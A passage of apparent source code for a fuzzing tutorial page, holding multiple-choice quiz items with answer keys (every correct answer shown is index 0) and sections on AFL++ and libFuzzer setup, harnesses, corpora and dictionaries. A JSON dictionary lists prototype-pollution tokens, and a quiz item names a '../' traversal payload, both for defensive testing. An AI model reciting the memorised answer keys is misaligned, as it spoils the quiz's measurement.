    options: ["Invalid memory access", "Normal exit", "Network timeout", "File not found"],
    correctAnswer: 0,
    explanation: "SIGSEGV signals a memory access violation.",
  },
  {
    id: 63,
    topic: "Crashes",
    question: "A double free is often detected by:",
    options: ["ASan or allocator checks", "DNS logs", "HTTP status", "Kernel modules"],
    correctAnswer: 0,
    explanation: "Sanitizers and allocators detect double frees.",
  },
  {
    id: 64,
    topic: "Corpus",
    question: "AFL-cmin is used to:",
    options: ["Minimize a corpus by coverage", "Encrypt inputs", "Compile targets", "Patch binaries"],
    correctAnswer: 0,
    explanation: "afl-cmin reduces inputs while preserving coverage.",
  },
  {
    id: 65,
    topic: "Corpus",
    question: "Keeping the corpus small helps:",
    options: ["Speed and focus on unique coverage", "Increase duplicates", "Reduce findings", "Hide crashes"],
    correctAnswer: 0,
    explanation: "Smaller corpuses reduce redundant fuzzing.",
  },
  {
    id: 66,
    topic: "Coverage",
    question: "Branch coverage differs from edge coverage by:",
    options: ["Tracking individual branch outcomes", "Only counting files", "Ignoring control flow", "Measuring disk IO"],
    correctAnswer: 0,
    explanation: "Branch coverage tracks true/false branch outcomes.",
  },
  {
    id: 67,
    topic: "Mutation",
    question: "Deterministic stages usually include:",
    options: ["Systematic bit and byte flips", "Only random changes", "Only dictionary insertion", "Only splicing"],
    correctAnswer: 0,
    explanation: "Deterministic stages try predictable mutations first.",
  },
  {
    id: 68,
    topic: "Mutation",
    question: "Havoc stages are:",
    options: ["Random and high-entropy", "Deterministic", "Disabled by default", "Only for web fuzzing"],
    correctAnswer: 0,
    explanation: "Havoc uses random mutation combinations.",
  },
  {
    id: 69,
    topic: "Techniques",
    question: "Stateful fuzzers often model:",
    options: ["Protocol state transitions", "Only file size", "Only CPU use", "Only disk IO"],
    correctAnswer: 0,
    explanation: "Stateful fuzzing tracks session state.",
  },
  {
    id: 70,
    topic: "Techniques",
    question: "Network fuzzing commonly uses:",
    options: ["A harness that feeds packet data to parsers", "Only static files", "Only GUI tools", "Only patching"],
    correctAnswer: 0,
    explanation: "Network fuzzing targets protocol parsers.",
  },
  {
    id: 71,
    topic: "Metrics",
    question: "A useful metric is:",
    options: ["Unique crashes and new coverage", "Only runtime", "Only file size", "Only CPU brand"],
    correctAnswer: 0,
    explanation: "Unique crashes and coverage show progress.",
  },
  {
    id: 72,
    topic: "Corpus",
    question: "Valid samples often help because:",
    options: ["They pass initial parsing checks", "They bypass sanitizers", "They disable fuzzing", "They remove coverage"],
    correctAnswer: 0,
    explanation: "Valid inputs reach deeper parsing logic.",
  },
  {
    id: 73,
    topic: "Build",
    question: "libFuzzer builds often include:",
    options: ["-fsanitize=fuzzer,address", "Only -O0", "Only -static", "Only -g0"],
    correctAnswer: 0,
    explanation: "libFuzzer integrates with sanitizer flags.",
  },
  {
    id: 74,
    topic: "Build",
    question: "In AFL, the @@ token:",
    options: ["Is replaced with the input file path", "Is a comment", "Disables mutations", "Starts a debugger"],
    correctAnswer: 0,
    explanation: "@@ points to the generated input file.",
  },
  {
    id: 75,
    topic: "Operations",
    question: "A clean fuzzing environment should:",
    options: ["Be isolated and reproducible", "Share production secrets", "Disable logging", "Run as root always"],
    correctAnswer: 0,
    explanation: "Isolation reduces risk and improves reproducibility.",
  },
  // ========== NEW QUESTIONS: KERNEL FUZZING ==========
  {
    id: 76,
    topic: "Kernel",
    question: "syzkaller is primarily used for:",
    options: ["OS kernel fuzzing via syscall sequences", "Web application testing", "Mobile app fuzzing", "Static analysis"],
    correctAnswer: 0,
    explanation: "syzkaller generates syscall sequences to find kernel bugs.",
  },
  {
    id: 77,
    topic: "Kernel",
    question: "KASAN in the Linux kernel detects:",
    options: ["Memory safety bugs like use-after-free", "Network errors", "Filesystem corruption", "CPU overheating"],
    correctAnswer: 0,
    explanation: "KASAN is the Kernel Address Sanitizer for memory bugs.",
  },
  {
    id: 78,
    topic: "Kernel",
    question: "KCOV is used in kernel fuzzing for:",
    options: ["Collecting code coverage", "Encrypting syscalls", "Memory allocation", "Process scheduling"],
    correctAnswer: 0,
    explanation: "KCOV provides coverage feedback for kernel fuzzing.",
  },
  {
    id: 79,
    topic: "Kernel",
    question: "Device driver fuzzing is important because:",
    options: ["Drivers run in kernel mode with high privileges", "Drivers are always secure", "Drivers don't process user input", "Drivers are isolated from hardware"],
    correctAnswer: 0,
    explanation: "Driver bugs can lead to privilege escalation and system compromise.",
  },
  {
    id: 80,
    topic: "Kernel",
    question: "syzkaller uses syzlang to:",
    options: ["Describe syscall semantics and types", "Compile the kernel", "Encrypt crash reports", "Generate coverage reports"],
    correctAnswer: 0,
    explanation: "syzlang describes how syscalls work for smart fuzzing.",
  },
  // ========== NEW QUESTIONS: SMART CONTRACTS ==========
  {
    id: 81,
    topic: "Smart Contracts",
    question: "Echidna is a fuzzer for:",
    options: ["Ethereum smart contracts", "Linux kernel", "Web browsers", "Python scripts"],
    correctAnswer: 0,
    explanation: "Echidna property-based tests Solidity contracts.",
  },
  {
    id: 82,
    topic: "Smart Contracts",
    question: "Reentrancy vulnerabilities in smart contracts occur when:",
    options: ["External calls happen before state updates", "Gas runs out", "Contracts are compiled", "Keys are lost"],
    correctAnswer: 0,
    explanation: "Reentrancy lets attackers re-enter functions before state changes.",
  },
  {
    id: 83,
    topic: "Smart Contracts",
    question: "Why is smart contract fuzzing critical?",
    options: ["Contracts are immutable after deployment", "Contracts are always secure", "Bugs can be patched easily", "Testing is optional"],
    correctAnswer: 0,
    explanation: "Once deployed, smart contract bugs cannot be fixed.",
  },
  {
    id: 84,
    topic: "Smart Contracts",
    question: "Foundry's fuzz testing uses:",
    options: ["Function parameters as fuzz inputs", "Only hardcoded values", "No test execution", "Manual input only"],
    correctAnswer: 0,
    explanation: "Foundry fuzzes function arguments automatically.",
  },
  {
    id: 85,
    topic: "Smart Contracts",
    question: "Integer overflow in smart contracts can lead to:",
    options: ["Fund theft via balance manipulation", "Faster execution", "Better security", "Lower gas costs"],
    correctAnswer: 0,
    explanation: "Overflows can make balances wrap to unexpected values.",
  },
  // ========== NEW QUESTIONS: COVERAGE ==========
  {
    id: 86,
    topic: "Coverage",
    question: "Edge coverage measures:",
    options: ["Transitions between basic blocks", "Total lines of code", "File sizes", "Memory usage"],
    correctAnswer: 0,
    explanation: "Edge coverage counts control flow transitions.",
  },
  {
    id: 87,
    topic: "Coverage",
    question: "lcov is used to:",
    options: ["Generate HTML coverage reports", "Compile code", "Run fuzzers", "Debug crashes"],
    correctAnswer: 0,
    explanation: "lcov creates visual coverage reports from gcov data.",
  },
  {
    id: 88,
    topic: "Coverage",
    question: "Coverage plateaus indicate:",
    options: ["Need for better seeds or mutations", "Fuzzing is complete", "Target has no bugs", "Coverage is disabled"],
    correctAnswer: 0,
    explanation: "Plateaus mean the fuzzer isn't finding new paths.",
  },
  {
    id: 89,
    topic: "Coverage",
    question: "llvm-cov provides:",
    options: ["Coverage analysis for LLVM-compiled code", "Kernel debugging", "Network monitoring", "File encryption"],
    correctAnswer: 0,
    explanation: "llvm-cov shows which code was executed.",
  },
  // ========== NEW QUESTIONS: CVEs ==========
  {
    id: 90,
    topic: "CVEs",
    question: "Heartbleed (CVE-2014-0160) was caused by:",
    options: ["Missing bounds check on TLS heartbeat length", "SQL injection", "XSS vulnerability", "Race condition"],
    correctAnswer: 0,
    explanation: "Heartbleed read beyond buffer bounds in heartbeat responses.",
  },
  {
    id: 91,
    topic: "CVEs",
    question: "Dirty COW (CVE-2016-5195) exploited:",
    options: ["Race condition in copy-on-write mechanism", "Buffer overflow", "Format string bug", "Use-after-free"],
    correctAnswer: 0,
    explanation: "Dirty COW used race conditions to write read-only memory.",
  },
  {
    id: 92,
    topic: "CVEs",
    question: "Log4Shell (CVE-2021-44228) allowed RCE via:",
    options: ["JNDI injection in log messages", "Buffer overflow", "Integer overflow", "Memory leak"],
    correctAnswer: 0,
    explanation: "Log4j processed JNDI lookups in logged strings.",
  },
  {
    id: 93,
    topic: "CVEs",
    question: "Fuzzing could have found Heartbleed by:",
    options: ["Testing malformed heartbeat length values", "Only static analysis", "Code review only", "Unit testing"],
    correctAnswer: 0,
    explanation: "Fuzzing length fields would have triggered the OOB read.",
  },
  // ========== NEW QUESTIONS: ADVANCED TOOLS ==========
  {
    id: 94,
    topic: "Tools",
    question: "cargo-fuzz is designed for:",
    options: ["Rust applications", "Python code", "Java applications", "Shell scripts"],
    correctAnswer: 0,
    explanation: "cargo-fuzz integrates libFuzzer with Rust's cargo.",
  },
  {
    id: 95,
    topic: "Tools",
    question: "Go 1.18+ includes:",
    options: ["Native fuzz testing support", "No testing tools", "Only unit tests", "Only benchmarks"],
    correctAnswer: 0,
    explanation: "Go has built-in coverage-guided fuzzing since 1.18.",
  },
  {
    id: 96,
    topic: "Tools",
    question: "OSS-Fuzz is:",
    options: ["Google's continuous fuzzing service for open source", "A static analyzer", "A debugger", "A code formatter"],
    correctAnswer: 0,
    explanation: "OSS-Fuzz runs fuzzers 24/7 on open source projects.",
  },
  {
    id: 97,
    topic: "Tools",
    question: "Fuzzilli targets:",
    options: ["JavaScript engine internals", "Database queries", "Network protocols", "File systems"],
    correctAnswer: 0,
    explanation: "Fuzzilli finds bugs in JS engines like V8.",
  },
  {
    id: 98,
    topic: "Tools",
    question: "Domato is used for:",
    options: ["Browser DOM/rendering fuzzing", "Kernel testing", "API fuzzing", "Mobile testing"],
    correctAnswer: 0,
    explanation: "Domato generates complex HTML/CSS/JS for browsers.",
  },
  // ========== NEW QUESTIONS: ADVANCED TECHNIQUES ==========
  {
    id: 99,
    topic: "Techniques",
    question: "Redqueen/I2S helps bypass:",
    options: ["Magic byte comparisons without dictionaries", "Network firewalls", "Authentication", "Encryption"],
    correctAnswer: 0,
    explanation: "Redqueen extracts comparison operands automatically.",
  },
  {
    id: 100,
    topic: "Techniques",
    question: "Structure-aware fuzzing:",
    options: ["Mutates input while preserving format validity", "Only uses random bytes", "Ignores input format", "Disables coverage"],
    correctAnswer: 0,
    explanation: "Structure-aware mutators understand input formats.",
  },
  {
    id: 101,
    topic: "Techniques",
    question: "CMP log instrumentation helps with:",
    options: ["Extracting comparison values for better mutations", "Compiling code faster", "Reducing memory usage", "Network testing"],
    correctAnswer: 0,
    explanation: "CMP logging reveals what values to mutate toward.",
  },
  {
    id: 102,
    topic: "Techniques",
    question: "Grammar-based fuzzing is best for:",
    options: ["Structured inputs like SQL or JSON", "Random binary data", "Simple text files", "Network packets only"],
    correctAnswer: 0,
    explanation: "Grammars generate syntactically valid complex inputs.",
  },
  {
    id: 103,
    topic: "Techniques",
    question: "MOpt mutation scheduling uses:",
    options: ["Particle swarm optimization for mutation selection", "Only random selection", "Fixed mutation ratios", "No optimization"],
    correctAnswer: 0,
    explanation: "MOpt dynamically adjusts mutation operator weights.",
  },
  // ========== NEW QUESTIONS: MAGIC VALUES ==========
  {
    id: 104,
    topic: "Values",
    question: "Testing with NaN (Not-a-Number) helps find:",
    options: ["Floating-point edge case bugs", "Integer overflows", "String bugs", "Memory leaks"],
    correctAnswer: 0,
    explanation: "NaN propagation can cause unexpected behavior.",
  },
  {
    id: 105,
    topic: "Values",
    question: "Year 2038 is important to test because:",
    options: ["32-bit time_t overflows", "Y2K repeats", "Leap years fail", "Timezones break"],
    correctAnswer: 0,
    explanation: "32-bit signed time wraps at 2038-01-19.",
  },
  {
    id: 106,
    topic: "Values",
    question: "Unicode surrogate pairs should be tested for:",
    options: ["Invalid/unpaired surrogates causing crashes", "Performance only", "Color display", "Font rendering"],
    correctAnswer: 0,
    explanation: "Malformed surrogates can crash string handling code.",
  },
  {
    id: 107,
    topic: "Values",
    question: "Path traversal payloads like '../' test for:",
    options: ["Directory escape vulnerabilities", "Speed improvements", "Memory usage", "CPU efficiency"],
    correctAnswer: 0,
    explanation: "Traversal allows accessing files outside allowed directories.",
  },
  {
    id: 108,
    topic: "Values",
    question: "Negative zero (-0.0) in IEEE 754:",
    options: ["Can cause edge cases in comparisons", "Is identical to 0.0 always", "Doesn't exist", "Only appears in errors"],
    correctAnswer: 0,
    explanation: "-0.0 equals 0.0 but has different bit representation.",
  },
];

// ========== SECTION CONTENT ==========

const fundamentalsSections: TopicSection[] = [
  {
    title: "What is Fuzzing?",
    icon: <BugReportIcon />,
    content: "Fuzzing (fuzz testing) is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The goal is to find bugs, crashes, assertion failures, memory leaks, and security vulnerabilities that traditional testing misses. Unlike manual testing where humans craft specific test cases, fuzzing generates thousands or millions of test inputs automatically, exploring the vast input space that would be impossible to cover manually. The technique was first developed at the University of Wisconsin-Madison in 1988 by Professor Barton Miller, who discovered that sending random characters to Unix utilities caused many of them to crash. Since then, fuzzing has evolved from simple random testing to sophisticated coverage-guided approaches that intelligently explore program behavior. Today, fuzzing is a cornerstone of modern software security testing, used by major tech companies including Google, Microsoft, and Apple to find vulnerabilities before attackers do. Google's OSS-Fuzz project alone has found over 10,000 bugs in critical open-source software. The power of fuzzing lies in its ability to discover edge cases and unexpected behaviors that developers never anticipated—the 'unknown unknowns' that lurk in complex codebases.",
    points: [
      "Automated: Runs continuously without human intervention, testing millions of inputs per day",
      "Black/Grey/White Box: Can work with or without source code and internal knowledge",
      "Coverage-Guided: Modern fuzzers track code paths to maximize coverage and find deeper bugs",
      "Mutation-Based: Generates new inputs by modifying existing valid inputs with smart mutations",
      "Generation-Based: Creates inputs from scratch based on format specifications or grammars",
      "Finds Real Bugs: Responsible for discovering thousands of CVEs in production software worldwide",
      "Complements Testing: Works alongside unit tests, integration tests, and manual code review",
      "Continuous Security: Can run 24/7 in CI/CD pipelines to catch regressions automatically",
    ],
  },
  {
    title: "Types of Fuzzing",
    icon: <SpeedIcon />,
    content: "Different fuzzing approaches suit different targets and requirements. Understanding these helps you choose the right technique for your specific testing scenario. The fundamental distinction is between black-box fuzzing (no knowledge of internals), grey-box fuzzing (partial feedback like code coverage), and white-box fuzzing (full program analysis with constraint solving). Black-box fuzzing is the simplest approach—you treat the target as an opaque box and simply throw inputs at it, observing only whether it crashes. While easy to set up, black-box fuzzing is often inefficient because it can't tell when an input almost triggered a bug. Grey-box fuzzing, pioneered by tools like AFL (American Fuzzy Lop), revolutionized the field by using lightweight instrumentation to track which code paths each input exercises. When a mutated input discovers a new code path, the fuzzer saves it for further mutation, creating an evolutionary process that efficiently explores the codebase. White-box fuzzing takes this further by using symbolic execution to reason about program paths mathematically, but at significant computational cost. Most security teams today rely on grey-box fuzzing as the best balance of effectiveness and efficiency. The choice between mutation-based and generation-based fuzzing depends on whether you have good seed inputs and how complex your target's input format is.",
    table: {
      headers: ["Type", "Approach", "Best For", "Examples"],
      rows: [
        ["Dumb Fuzzing", "Random mutations, no feedback", "Quick and dirty testing, legacy systems", "Radamsa, zzuf"],
        ["Coverage-Guided", "Uses code coverage to guide mutations", "Finding deep bugs in complex code", "AFL++, libFuzzer, Honggfuzz"],
        ["Grammar-Based", "Generates inputs from grammar/spec", "Complex formats like compilers, SQL", "Peach, Dharma, Grammarinator"],
        ["Protocol Fuzzing", "Understands network protocols and state", "Network services and APIs", "boofuzz, Sulley, AFLNet"],
        ["API Fuzzing", "Tests function/REST APIs systematically", "Libraries, web services, microservices", "RESTler, Atheris, Jazzer"],
        ["Concolic/Symbolic", "Uses SMT solvers for path exploration", "Hitting specific hard-to-reach code", "KLEE, Angr, Manticore"],
      ],
    },
  },
  {
    title: "The Fuzzing Loop",
    icon: <MemoryIcon />,
    content: "Modern fuzzers operate in a tight feedback loop that maximizes efficiency and coverage. Understanding this loop is crucial for optimizing your fuzzing campaigns and interpreting their results. The process begins with a corpus—a collection of seed inputs that represent valid (or semi-valid) data your target can process. Each iteration of the loop selects an input from this corpus, applies one or more mutations (random changes), executes the target with the mutated input, and monitors the result. The magic of coverage-guided fuzzing is in the monitoring step: by tracking which basic blocks or edges of code are executed, the fuzzer can determine if a mutation led to new program behavior. If it did, that mutated input is added to the corpus as a new seed for future mutations, even if it didn't cause a crash. This creates an evolutionary pressure that drives the fuzzer deeper into the codebase over time. Meanwhile, any crashes are saved separately for analysis. Modern fuzzers like AFL++ perform this loop at incredible speeds—often 10,000 or more executions per second—by using techniques like fork servers (which keep a copy of the initialized process ready to fork) and persistent mode (which processes multiple inputs per process invocation). The efficiency of your fuzzing setup directly determines how thoroughly you can explore your target in a given time budget.",
    points: [
      "1. Select Input: Pick a seed from the corpus (queue of interesting inputs) using scheduling algorithms",
      "2. Mutate: Apply mutation strategies (bit flips, byte insertions, dictionary tokens, havoc) to create new test cases",
      "3. Execute: Run the target with the mutated input, using fork servers or persistent mode for speed",
      "4. Monitor: Track crashes, hangs, coverage changes, and sanitizer reports (ASan, UBSan, MSan)",
      "5. Triage: If new coverage found, add to corpus. If crash, save input and stack trace for analysis",
      "6. Repeat: Continue millions of times per second with intelligent scheduling and prioritization",
    ],
    tip: "Coverage-guided fuzzers can execute 10,000+ test cases per second on modern hardware. Running for days or weeks often finds bugs that hours of fuzzing miss.",
  },
  {
    title: "Why Fuzzing Finds Bugs",
    icon: <CodeIcon />,
    content: "Fuzzing is effective because it explores the vast input space that developers and testers can't manually cover. Consider a simple function that parses a 100-byte file—the space of possible inputs is 256^100, an astronomically large number that no amount of manual testing could ever explore. Even with human intuition about 'interesting' test cases, we inevitably miss corner cases that attackers later discover. Fuzzing approaches this problem differently: instead of trying to think of all possible edge cases, it systematically generates and tests millions of variations, using coverage feedback to focus on inputs that trigger new behavior. This is why fuzzing frequently discovers bugs that have existed unnoticed for decades—like the Heartbleed vulnerability in OpenSSL, which existed for over two years before being found by fuzzing. Fuzzing is particularly good at finding memory corruption bugs (buffer overflows, use-after-free, integer overflows) because these often require specific byte sequences that humans wouldn't think to test but fuzzers eventually discover. When combined with sanitizers like AddressSanitizer, even subtle memory bugs that don't cause immediate crashes become detectable. The key insight is that developers write code with implicit assumptions about what inputs are 'reasonable'—fuzzing systematically violates those assumptions to find where the code breaks.",
    points: [
      "Explores Edge Cases: Tests inputs that humans wouldn't think to try, systematically covering corner cases",
      "Finds Assumption Violations: Exposes where code assumes 'this will never happen' (and is wrong)",
      "Scales Infinitely: Can run 24/7 across distributed systems, testing billions of inputs over time",
      "Reproducible: Every crash has an exact input file to reproduce it, making debugging straightforward",
      "Complements Other Testing: Finds bugs that unit tests and code review miss due to human blind spots",
      "Proven Track Record: Has found critical bugs in every major browser, OS kernel, database, and library",
      "Economical at Scale: Once set up, fuzzing runs automatically with minimal ongoing human effort",
      "Catches Regressions: Running in CI catches bugs reintroduced by code changes before they ship",
    ],
    warning: "Fuzzing alone isn't enough. It excels at finding crashes and memory corruption but may miss logic bugs, authorization flaws, and cryptographic weaknesses. Combine fuzzing with code review, static analysis, and manual penetration testing for comprehensive security.",
  },
];

const setupSections: TopicSection[] = [
  {
    title: "Preparing Your Target",
    icon: <CodeIcon />,
    content: "Proper target preparation dramatically improves fuzzing effectiveness. The goal is fast execution with good crash detection. Before you start fuzzing, you need to consider how your target will be compiled, what feedback mechanisms you'll use, and how you'll detect bugs. The most important preparation step is enabling sanitizers—runtime checks that detect memory bugs, undefined behavior, and other issues that might not cause immediate crashes but are still security vulnerabilities. AddressSanitizer (ASan) catches buffer overflows, use-after-free, and other memory errors with roughly 2x slowdown. UndefinedBehaviorSanitizer (UBSan) catches integer overflows, type confusion, and other undefined behaviors. MemorySanitizer (MSan) detects reads of uninitialized memory. Using these together with fuzzing transforms subtle bugs that might go unnoticed into clear crashes with detailed reports. Beyond sanitizers, you should disable expensive features that slow down execution without contributing to bug-finding: logging (which creates I/O overhead), checksums (which reject most mutated inputs early), and authentication (which prevents the fuzzer from reaching interesting code). The goal is to make each execution as fast as possible while still exercising your target's core functionality.",
    points: [
      "Compile with sanitizers: AddressSanitizer (ASan), UndefinedBehaviorSanitizer (UBSan), MemorySanitizer (MSan)",
      "Enable debug symbols (-g) for meaningful crash reports, stack traces, and source-level debugging",
      "Disable expensive features: logging, checksums, authentication, encryption during fuzzing",
      "Create a harness: Minimal code that calls your target function directly with fuzz input",
      "Persistent mode: Keep process alive between test cases for 10-100x speedup over fork-per-input",
      "Remove sources of non-determinism: fixed random seeds, mocked timestamps, deterministic allocators",
      "Link statically when possible: Reduces startup overhead and ensures consistent behavior",
      "Use LTO (Link Time Optimization): Improves instrumentation quality and execution speed",
    ],
    code: `# Compile with AFL++ and AddressSanitizer for maximum bug detection
export CC=afl-clang-fast
export CXX=afl-clang-fast++
export CFLAGS="-fsanitize=address,undefined -g -O2"
export CXXFLAGS="-fsanitize=address,undefined -g -O2"
export AFL_USE_ASAN=1
export AFL_USE_UBSAN=1

# Configure with static linking and without optional features
./configure --disable-shared --disable-logging --without-ssl
make clean && make -j$(nproc)

# Verify instrumentation
afl-showmap -o /dev/null -- ./target < test_input
# Should show "Captured X tuples" where X > 0`,
  },
  {
    title: "Building a Fuzz Harness",
    icon: <TerminalIcon />,
    content: "A harness is a small program that reads fuzz input and passes it to your target code. Good harnesses are the key to effective fuzzing—they determine what code gets tested and how efficiently. The harness acts as an adapter between the fuzzer (which provides raw bytes) and your target (which expects structured input). For libFuzzer, the harness is a function called LLVMFuzzerTestOneInput that receives a byte array; for AFL++, it's typically a program that reads from stdin or a file. The art of harness writing is finding the right level of abstraction: too high-level (e.g., testing a full HTTP server) and most inputs are rejected early as invalid; too low-level (e.g., testing a single parsing function) and you miss bugs in how functions interact. A good harness should be deterministic (same input always produces same behavior), avoid persistent state (reset between iterations), and handle edge cases gracefully (empty input, very large input, malformed data). You should also consider what happens with invalid inputs—ideally your harness should not crash on malformed data, leaving crashes as genuine bug signals rather than harness errors. Memory management is crucial: always free allocated memory to allow AddressSanitizer to detect use-after-free bugs, and be careful not to leak memory in loops.",
    code: `// Example libFuzzer harness for a JSON parser
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "json_parser.h"

// Optional: Initialize resources once before fuzzing starts
extern "C" int LLVMFuzzerInitialize(int *argc, char ***argv) {
    // One-time initialization (load dictionaries, initialize globals)
    return 0;
}

// This function is called for each fuzz input - called millions of times!
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // Early exit for trivially small inputs (optional optimization)
    if (size < 2) return 0;

    // Create null-terminated string from fuzz data
    char *json = (char *)malloc(size + 1);
    if (!json) return 0;  // Out of memory - graceful exit

    memcpy(json, data, size);
    json[size] = '\\0';

    // Call the function we want to fuzz
    // Wrap in try-catch if testing C++ code that might throw
    JsonDocument *doc = json_parse(json);

    // Exercise more of the API if parsing succeeded
    if (doc) {
        json_validate(doc);      // Test validation
        char *out = json_serialize(doc);  // Test serialization
        if (out) free(out);
        json_free(doc);          // Test cleanup
    }

    // Always clean up - essential for ASan to detect UAF
    free(json);

    return 0;  // Always return 0 (non-zero values reserved for special cases)
}`,
    tip: "Keep harnesses simple! Only call the code you want to test. Avoid file I/O, network calls, and complex setup. Simpler harnesses are faster and easier to debug.",
  },
  {
    title: "Seed Corpus Creation",
    icon: <StorageIcon />,
    content: "A good seed corpus dramatically improves fuzzing efficiency. Seeds should be small, diverse, and valid. The seed corpus is your starting point—the fuzzer will mutate these inputs to explore new code paths. Without good seeds, a coverage-guided fuzzer might spend hours or days just discovering basic valid input structures that you could provide upfront. The ideal seed corpus contains inputs that are valid (accepted by your target), diverse (exercising different features and code paths), and minimal (as small as possible while still being valid). For example, if fuzzing an image parser, include small examples of each supported format (PNG, JPEG, GIF) rather than one huge image. For a compiler, include examples using different language features. The 'minimal' aspect is crucial: smaller inputs mutate faster and are more likely to produce useful variations. Use corpus minimization tools (afl-cmin, afl-tmin) to reduce your seeds to the smallest set that maintains the same code coverage. You can gather seeds from multiple sources: existing test suites, sample files from documentation, real-world data (sanitized for privacy), and manually crafted edge cases. Don't forget to include semi-valid inputs that exercise error handling paths—parsers should gracefully reject invalid input, and fuzzing can verify they do so without crashing.",
    points: [
      "Start with valid inputs: Working files, requests, or data your target accepts and processes successfully",
      "Minimize seeds: Use afl-cmin (corpus level) and afl-tmin (individual files) to remove redundancy",
      "Diversity matters: Include edge cases, different features, various sizes, and different format variants",
      "Small is beautiful: Smaller seeds = faster mutations = more executions per second = more coverage",
      "Use existing test suites: Unit tests often contain well-crafted edge cases and valid examples",
      "Protocol samples: Capture real traffic for network protocol fuzzing using tcpdump or Wireshark",
      "Include near-invalid inputs: Slightly malformed data that exercises error handling paths",
      "Organize by feature: Group seeds by functionality to track coverage of different target features",
    ],
    code: `# Step 1: Gather initial seeds from various sources
mkdir -p seeds/
cp /path/to/test_files/* seeds/          # Existing test cases
curl -o seeds/sample.json example.com/api/sample  # Real-world examples
echo '{}' > seeds/minimal.json            # Minimal valid input
echo '{"key": "value"}' > seeds/simple.json

# Step 2: Minimize corpus by coverage (keep only inputs that add unique coverage)
afl-cmin -i seeds/ -o min_corpus/ -- ./target @@
echo "Reduced from $(ls seeds/ | wc -l) to $(ls min_corpus/ | wc -l) seeds"

# Step 3: Further minimize individual files (remove unnecessary bytes)
mkdir -p tiny_corpus/
for f in min_corpus/*; do
  afl-tmin -i "$f" -o "tiny_corpus/$(basename $f)" -- ./target @@
done

# Step 4: Check coverage of final corpus
afl-showmap -C -i tiny_corpus/ -o /dev/null -- ./target @@

# Step 5: Start fuzzing with optimized corpus
afl-fuzz -i tiny_corpus/ -o findings/ -- ./target @@`,
  },
  {
    title: "Dictionary Files",
    icon: <HttpIcon />,
    content: "Dictionaries provide tokens that are meaningful for your target format, helping the fuzzer discover interesting code paths faster. A dictionary is a file containing strings or byte sequences that have special meaning in your target's input format—keywords, operators, magic numbers, common values, and delimiters. When you provide a dictionary, the fuzzer will insert these tokens into inputs during mutation, dramatically increasing the chances of generating syntactically meaningful test cases. For example, when fuzzing a SQL parser, a dictionary containing 'SELECT', 'WHERE', 'UNION', 'DROP', and other SQL keywords helps the fuzzer quickly discover SQL injection-like patterns that would take random mutation much longer to stumble upon. Similarly, for JSON fuzzing, tokens like 'true', 'false', 'null', '{}', and '[]' help the fuzzer understand the format structure. Creating a good dictionary requires understanding your target's input format. Look at the parser source code for string comparisons and magic values. Check documentation for keywords and reserved words. Extract tokens from valid input samples. AFL++ includes pre-built dictionaries for many common formats (JSON, XML, HTML, SQL, JavaScript) that provide a great starting point.",
    code: `# Example dictionary for JSON fuzzing (json.dict)
# Basic JSON tokens
"true"
"false"
"null"
"\\"string\\""
"[]"
"{}"
":"
","

# Escape sequences
"\\\\n"
"\\\\r"
"\\\\t"
"\\\\u0000"
"\\\\\\"escaped\\\\\\""

# Numeric edge cases
"-1"
"0"
"1"
"9999999999999999999"
"1e308"
"1e-308"
"1.7976931348623157e+308"  # Max double

# Structural tokens
"{\\"key\\":\\"value\\"}"
"[\\"item\\"]"

# Potentially dangerous values
"__proto__"
"constructor"

# Use with AFL++
afl-fuzz -x json.dict -i seeds/ -o out/ -- ./json_parser @@

# Use with libFuzzer (place in corpus directory)
./json_fuzzer corpus/ -dict=json.dict`,
    tip: "AFL++ includes dictionaries for many common formats in /usr/share/afl/dictionaries/. Check there before creating your own—you can always extend existing dictionaries with target-specific tokens.",
  },
];

const advancedSections: TopicSection[] = [
  {
    title: "Parallel & Distributed Fuzzing",
    icon: <SpeedIcon />,
    content: "Scale your fuzzing across multiple cores and machines for maximum coverage. A single fuzzer instance, no matter how fast, will eventually hit diminishing returns as it explores the same code paths repeatedly. Parallel fuzzing multiplies your testing power by running multiple fuzzer instances that share findings. AFL++ supports two modes of parallel fuzzing: local (multiple instances on one machine sharing a sync directory) and distributed (instances on different machines synchronizing via shared filesystem or network). The key insight is that different fuzzer instances often get 'stuck' in different parts of the code—by sharing their findings, each instance benefits from the others' discoveries. You should designate one instance as the 'main' (-M) which performs thorough deterministic mutations first, while 'secondary' instances (-S) focus on random havoc mutations. This division of labor ensures comprehensive coverage while maximizing throughput. On a modern multi-core server, you can easily run 16-64 fuzzer instances in parallel. For longer campaigns, consider using cloud resources—fuzzing is embarrassingly parallel and scales nearly linearly with added cores. Some teams run fuzzing clusters with hundreds of cores for critical targets like browsers or operating systems.",
    code: `# AFL++ parallel fuzzing on one machine
# Master instance (does deterministic fuzzing first)
afl-fuzz -M main -i seeds/ -o sync_dir/ -- ./target @@

# Secondary instances (skip deterministic, pure havoc)
afl-fuzz -S fuzzer02 -i seeds/ -o sync_dir/ -- ./target @@
afl-fuzz -S fuzzer03 -i seeds/ -o sync_dir/ -- ./target @@
afl-fuzz -S fuzzer04 -i seeds/ -o sync_dir/ -- ./target @@

# One-liner to launch on all cores
for i in $(seq 2 $(nproc)); do
  afl-fuzz -S fuzzer$i -i seeds/ -o sync_dir/ -- ./target @@ &
done

# Check status of all fuzzers
afl-whatsup sync_dir/
watch -n 5 afl-whatsup sync_dir/  # Auto-refresh every 5 seconds

# Distributed: Use afl-sync or shared filesystem (NFS/CIFS)
# Each machine runs instances with unique -S names
# Machine 1: afl-fuzz -M main -i seeds/ -o /nfs/sync_dir/ -- ./target @@
# Machine 2: afl-fuzz -S node2_fuzzer1 -i seeds/ -o /nfs/sync_dir/ -- ./target @@`,
    points: [
      "One -M (main) instance per campaign: Does deterministic mutations first for systematic coverage",
      "Multiple -S (secondary) instances for parallel havoc and random mutations",
      "Use all available cores: CPU-bound fuzzing benefits linearly from parallelization",
      "Sync directory: All instances share findings automatically every few minutes",
      "Different strategies: Run some instances with different dictionaries, seeds, or mutation settings",
      "Cloud scaling: Use AWS Spot instances or GCP preemptible VMs for cost-effective large-scale fuzzing",
      "Crash sharing: All instances share crashes, so any crash is immediately available to all",
    ],
  },
  {
    title: "Persistent Mode",
    icon: <MemoryIcon />,
